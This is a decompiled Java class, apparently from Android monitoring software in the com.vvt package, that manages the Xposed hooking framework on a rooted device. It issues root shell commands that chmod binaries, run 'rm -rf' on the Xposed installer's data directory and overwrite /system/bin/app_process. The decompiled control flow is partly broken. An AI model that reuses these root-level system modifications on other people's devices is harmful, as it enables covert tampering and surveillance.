package com.vvt.am;

import android.os.Build;
import android.os.Build.VERSION;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;

public class a
{
  public static final Set a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private String d = null;
  private String e = null;
  private String f = null;
  private String g = null;
  
  static
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    localHashSet.add("arm_app_process_xposed_sdk15");
    localHashSet.add("arm_app_process_xposed_sdk16");
    localHashSet.add("arm_xposedtest_sdk15");
    localHashSet.add("arm_xposedtest_sdk16");
    localHashSet.add("ticket.apk");
    localHashSet.add("x86_app_process_xposed_sdk15");
    localHashSet.add("x86_app_process_xposed_sdk16");
    localHashSet.add("x86_xposedtest_sdk15");
    localHashSet.add("x86_xposedtest_sdk16");
    localHashSet.add("Xposed-Disabler-Recovery.zip");
    localHashSet.add("Xposed-Installer-Recovery.zip");
    localHashSet.add("XposedBridge.jar");
    a = Collections.unmodifiableSet(localHashSet);
  }
  
  private String c()
  {
    String str1 = this.e;
    String str2 = this.f;
    return p.a(str1, str2);
  }
  
  private String d()
  {
    String str1 = Build.CPU_ABI;
    String str2 = "armeabi";
    boolean bool = str1.startsWith(str2);
    if (bool) {
      str1 = "arm_";
    }
    for (;;)
    {
      return str1;
      str1 = Build.CPU_ABI;
      str2 = "x86";
      bool = str1.startsWith(str2);
      if (bool)
      {
        str1 = "x86_";
      }
      else
      {
        bool = false;
        str1 = null;
      }
    }
  }
  
  private boolean e()
  {
    return f();
  }
  
  private boolean f()
  {
    bool1 = true;
    boolean bool2 = false;
    String str1 = this.d;
    if (str1 == null) {}
    for (;;)
    {
      return bool2;
      str1 = this.e;
      String str2 = this.d;
      str1 = p.a(str1, str2);
      bool3 = b;
      if (bool3) {}
      Object[] arrayOfObject = new Object[bool1];
      arrayOfObject[0] = str1;
      str2 = String.format("chmod 700 %s", arrayOfObject);
      try
      {
        KMShell.a(str2);
        bool3 = b;
        if (bool3) {}
        int i = 2;
        arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        arrayOfObject[bool1] = "--xposedversion";
        str2 = String.format("%s %s", arrayOfObject);
        boolean bool4 = false;
        str1 = null;
        try
        {
          str1 = KMShell.a(str2);
        }
        catch (Exception localException2)
        {
          for (;;)
          {
            bool3 = c;
            if (bool3)
            {
              continue;
              bool1 = false;
            }
          }
        }
        if (str1 != null)
        {
          str2 = "Xposed version: ";
          bool4 = str1.startsWith(str2);
          if (bool4) {
            bool2 = bool1;
          }
        }
      }
      catch (Exception localException1)
      {
        for (;;)
        {
          bool3 = c;
          if (!bool3) {}
        }
      }
    }
  }
  
  public void a(String paramString)
  {
    this.g = paramString;
  }
  
  public boolean a()
  {
    bool1 = true;
    boolean bool2 = false;
    boolean bool3 = b;
    if (bool3) {}
    for (;;)
    {
      try
      {
        bool3 = b;
        if (bool3) {}
        bool3 = true;
        ShellUtil.a(bool3);
        Object localObject1 = "chmod 777 %s";
        int i = 1;
        Object localObject2 = new Object[i];
        String str = c();
        localObject2[0] = str;
        localObject1 = String.format((String)localObject1, (Object[])localObject2);
        KMShell.a((String)localObject1);
        bool3 = com.vvt.aa.a.d();
        if (bool3)
        {
          localObject1 = "rm -rf %s";
          i = 1;
          localObject2 = new Object[i];
          str = "/data/data/de.robv.android.xposed.installer/";
          localObject2[0] = str;
          localObject1 = String.format((String)localObject1, (Object[])localObject2);
          KMShell.a((String)localObject1);
          localObject1 = new java/io/File;
          localObject2 = "/system/bin/app_process.orig";
          ((File)localObject1).<init>((String)localObject2);
          bool3 = ((File)localObject1).exists();
          if (!bool3)
          {
            bool1 = c;
            if (bool1) {}
            return bool2;
          }
        }
        else
        {
          localObject1 = "rm -r %s";
          i = 1;
          localObject2 = new Object[i];
          str = "/data/data/de.robv.android.xposed.installer/";
          localObject2[0] = str;
          localObject1 = String.format((String)localObject1, (Object[])localObject2);
          continue;
        }
        localObject1 = "%s mv /system/bin/app_process.orig /system/bin/app_process";
        i = 1;
        localObject2 = new Object[i];
        str = c();
        localObject2[0] = str;
        localObject1 = String.format((String)localObject1, (Object[])localObject2);
        KMShell.a((String)localObject1);
        localObject1 = "%s chmod 755 /system/bin/app_process";
        i = 1;
        localObject2 = new Object[i];
        str = c();
        localObject2[0] = str;
        localObject1 = String.format((String)localObject1, (Object[])localObject2);
        KMShell.a((String)localObject1);
        localObject1 = "chown root:shell /system/bin/app_process";
        KMShell.a((String)localObject1);
        localObject1 = "/system/bin/restorecon /system/bin/app_process";
        KMShell.a((String)localObject1);
      }
      catch (KMShell.ShellException localShellException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
        ShellUtil.a(false);
        bool1 = false;
        Object localObject3 = null;
        continue;
      }
      finally
      {
        ShellUtil.a(false);
      }
      bool2 = b;
      if (bool2) {}
      bool2 = bool1;
    }
  }
  
  public void b(String paramString)
  {
    this.e = paramString;
  }
  
  public boolean b()
  {
    int i = 19;
    boolean bool1 = false;
    Object localObject = null;
    String str = d();
    boolean bool2 = b;
    if ((!bool2) || (str == null)) {}
    for (;;)
    {
      return bool1;
      int j = Build.VERSION.SDK_INT;
      int k = 15;
      if (j == k)
      {
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        localObject = ((StringBuilder)localObject).append(str);
        str = "app_process_xposed_sdk15";
        localObject = str;
        this.d = ((String)localObject);
        bool1 = e();
      }
      else
      {
        j = Build.VERSION.SDK_INT;
        k = 16;
        if (j >= k)
        {
          j = Build.VERSION.SDK_INT;
          if (j <= i)
          {
            localObject = new java/lang/StringBuilder;
            ((StringBuilder)localObject).<init>();
            localObject = ((StringBuilder)localObject).append(str);
            str = "app_process_xposed_sdk16";
            localObject = str;
            this.d = ((String)localObject);
            bool1 = e();
            continue;
          }
        }
        j = Build.VERSION.SDK_INT;
        if (j > i)
        {
          localObject = new java/lang/StringBuilder;
          ((StringBuilder)localObject).<init>();
          localObject = ((StringBuilder)localObject).append(str);
          str = "app_process_xposed_sdk16";
          localObject = str;
          this.d = ((String)localObject);
          bool1 = e();
        }
      }
    }
  }
  
  public void c(String paramString)
  {
    this.f = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/am/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */